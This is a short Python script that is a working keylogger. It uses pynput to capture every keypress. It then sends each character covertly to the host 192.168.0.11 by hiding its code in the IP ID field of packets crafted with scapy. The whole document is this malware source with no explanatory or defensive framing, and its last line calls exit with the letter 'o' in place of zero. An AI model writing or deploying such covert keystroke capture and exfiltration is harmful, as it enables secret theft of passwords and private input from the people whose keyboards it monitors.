from scapy.all import TCP, IP, send
from sys import exit
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        char = ""
        if key == Key.space:
            char = " "
        else:
            char = key.char
        packet = IP(dst="192.168.0.11", id=ord(char)*255)/TCP(sport=222, dport=222)
        send(packet)
    except AttributeError:
        pass

try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    exit(o)
